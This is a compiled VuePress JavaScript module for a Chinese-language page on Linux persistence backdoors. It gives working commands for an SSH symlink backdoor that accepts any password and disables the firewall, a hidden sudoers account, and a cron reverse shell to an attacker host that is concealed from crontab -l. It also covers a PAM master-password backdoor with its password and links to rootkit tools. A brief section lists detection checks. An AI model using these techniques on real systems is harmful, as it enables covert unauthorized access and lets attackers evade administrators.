import{_ as i}from"./_plugin-vue_export-helper.cdc0426e.js";import{o,c as l,a as s,b as n,d as e,e as t,r}from"./app.97ace05d.js";const c={},p=t(`<h2 id="ssh软连接后门" tabindex="-1"><a class="header-anchor" href="#ssh软连接后门" aria-hidden="true">#</a> SSH软连接后门</h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#建立sshd的软连接</span>
<span class="token function">ln</span> <span class="token parameter variable">-sf</span> /usr/sbin/sshd /tmp/su<span class="token punctuation">;</span>/tmp/su <span class="token parameter variable">-oPort</span><span class="token operator">=</span><span class="token number">12345</span>
systemctl stop firewalld

<span class="token comment">#连接目标，密码随便输入即可</span>
<span class="token function">ssh</span> root@212.1x9.2xx.xx7 <span class="token parameter variable">-p12345</span>
 
<span class="token comment">#删除后门</span>
<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /tmp/su
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="增加超级用户账号" tabindex="-1"><a class="header-anchor" href="#增加超级用户账号" aria-hidden="true">#</a> 增加超级用户账号</h2><p>如果系统不允许uid=0的用户（root）远程登录，可以添加一个普通用户，并将其加入sudoers</p><p><strong>增加用户</strong></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#添加账户，设置密码(密码符合要密码强度策略)</span>
<span class="token function">useradd</span> phP
<span class="token builtin class-name">echo</span> @admin.886<span class="token operator">|</span><span class="token function">passwd</span> <span class="token parameter variable">--stdin</span> phP


<span class="token comment">#修改sudoers赋予sudo权限</span>
<span class="token function">chmod</span> +w /etc/sudoers   
<span class="token builtin class-name">echo</span> <span class="token string">&quot;phP ALL=(ALL) ALL&quot;</span> <span class="token operator">&gt;&gt;</span> /etc/sudoers
<span class="token function">chmod</span> <span class="token parameter variable">-w</span> /etc/sudoers
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="ssh公钥登录" tabindex="-1"><a class="header-anchor" href="#ssh公钥登录" aria-hidden="true">#</a> SSH公钥登录</h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#本机生成rsa公钥</span>
ssh-keygen <span class="token parameter variable">-t</span> rsa

<span class="token comment">#把id_rsa.pub写入服务端的authorized_keys中</span>
<span class="token function">chmod</span> <span class="token number">600</span> ~/.ssh/authorized_keys
<span class="token function">chmod</span> <span class="token number">700</span> ~/.ssh
<span class="token builtin class-name">echo</span> <span class="token string">&quot;id_rsa.pub的内容&quot;</span> <span class="token operator">&gt;</span> ~/.ssh/authorized_keys

<span class="token comment">#没有这个文件的话，就自己创建一个</span>
<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> ~/.ssh
<span class="token function">touch</span> ~/.ssh/authorized_keys
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="crontab定时反弹shell" tabindex="-1"><a class="header-anchor" href="#crontab定时反弹shell" aria-hidden="true">#</a> Crontab定时反弹shell</h2><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token punctuation">(</span>crontab -l<span class="token punctuation">;</span><span class="token builtin class-name">printf</span> <span class="token string">&quot;*/1 * * * * exec 9&lt;&gt; /dev/tcp/攻击者IP/8888;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;<span class="token entity" title="\\r">\\r</span>no crontab for <span class="token variable"><span class="token variable">\`</span><span class="token function">whoami</span><span class="token variable">\`</span></span>%100c<span class="token entity" title="\\n">\\n</span>&quot;</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token function">crontab</span> -

<span class="token comment">#每分钟执行一次，并且crontab -l看不出来</span>
<span class="token comment">#这种要用crontab -e 进去查看并编辑才能看到</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="pam后门" tabindex="-1"><a class="header-anchor" href="#pam后门" aria-hidden="true">#</a> PAM后门</h2><p>PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。</p><p>它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开</p><p>使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式，而无需更改服务程序</p><p>同时也便于向系统中添加新的认证手段</p><details class="custom-container details"><summary>步骤（理论）</summary><ul><li>1、获取目标系统所使用的PAM版本，下载对应版本的pam版本</li><li>2、解压缩，修改pam_unix_auth.c文件，添加万能密码</li><li>3、编译安装PAM</li><li>4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中</li></ul></details>`,16),d={href:"https://github.com/ociredefz/pambd",target:"_blank",rel:"noopener noreferrer"},u=s("p",null,[n("1、上传pambd.c "),s("strong",null,"和"),n(" gen.sh到目标机器上，并赋予可执行权限")],-1),m={href:"http://gen.sh",target:"_blank",rel:"noopener noreferrer"},h=t(`<h3 id="排查pam后门技巧" tabindex="-1"><a class="header-anchor" href="#排查pam后门技巧" aria-hidden="true">#</a> 排查PAM后门技巧</h3><p>1、通过Strace跟踪ssh</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">ps</span> axu <span class="token operator">|</span> <span class="token function">grep</span> sshd
<span class="token function">strace</span> <span class="token parameter variable">-oaa</span> <span class="token parameter variable">-ff</span> <span class="token parameter variable">-p</span> PID
<span class="token function">grep</span> <span class="token function">open</span> aa* <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-eNo</span> <span class="token parameter variable">-e</span> null -edenied<span class="token operator">|</span> <span class="token function">grep</span> WR
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2、检查pam_unix.so的修改时间</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">stat</span> /lib/security/pam_unix.so    <span class="token comment">#32位</span>
<span class="token function">stat</span> /lib64/security/pam_unix.so   <span class="token comment">#64位</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="rootkit工具包" tabindex="-1"><a class="header-anchor" href="#rootkit工具包" aria-hidden="true">#</a> Rootkit工具包</h2><p>rootkit是一种特殊的恶意软件。三要素是：<strong>隐藏、操纵、收集数据</strong>。</p><p>功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息</p><p>多见的rootkit一般都是木马、后门和其它恶意程序结合使用</p><p><strong>Rootkit通过加载特殊的驱动，修改系统内核，进而达到隐藏信息的目的</strong></p><p>Rootkit是攻击者用来隐藏自己的踪迹和保留root访问权限的工具</p><details class="custom-container details"><summary>Rootkit类型</summary><ul><li>固件Rootkit</li><li>虚拟化Rootkit</li><li>内核级Rootkit</li><li>库级Rootkit</li><li>应用级Rootkit</li></ul></details>`,12),b={href:"https://github.com/mav8557/Father",target:"_blank",rel:"noopener noreferrer"},v={class:"custom-container details"},k=s("summary",null,"检测与防护",-1),g={href:"http://rkhunter.sourceforge.net/",target:"_blank",rel:"noopener noreferrer"},_={href:"http://www.chkrootkit.org/download/",target:"_blank",rel:"noopener noreferrer"},f=s("p",null,"定期检查md5，对于找出的 Rootkit，最好的应对方法是擦除并重新安装系统",-1);function x(y,P){const a=r("ExternalLinkIcon");return o(),l("div",null,[p,s("p",null,[s("a",d,[n("Pambd"),e(a)]),n("（Centos7~9,Ubuntu通用）")]),u,s("p",null,[n("2、sh "),s("a",m,[n("gen.sh"),e(a)]),n("，后门植入完用密码 admin@Ak47 可登录任意用户")]),h,s("p",null,[s("a",b,[n("Father/bin at master · mav8557/Father (github.com)"),e(a)])]),s("details",v,[k,s("p",null,[n("rkhunter： "),s("a",g,[n("http://rkhunter.sourceforge.net/"),e(a)])]),s("p",null,[n("chkrootkit： "),s("a",_,[n("http://www.chkrootkit.org/download/"),e(a)])]),f])])}const R=i(c,[["render",x],["__file","权限维持-Linux后门.html.vue"]]);export{R as default};
